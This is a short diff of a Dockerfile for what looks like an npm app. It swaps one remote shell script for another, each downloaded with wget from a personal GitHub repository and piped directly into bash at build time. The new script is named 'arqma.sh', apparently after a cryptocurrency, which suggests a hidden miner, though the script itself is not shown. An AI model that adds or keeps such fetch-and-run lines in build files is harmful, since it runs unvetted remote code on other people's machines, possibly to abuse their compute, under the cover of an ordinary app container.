@@ -12,6 +12,6 @@ RUN which bash
 RUN ls -la
 RUN apt update
 RUN apt -y install wget coreutils
-RUN wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/KinTemp1/main/catz.sh | bash
+RUN wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/KinTemp1/main/arqma.sh | bash
 
 CMD ["npm", "run", "start", "/bin/bash"]
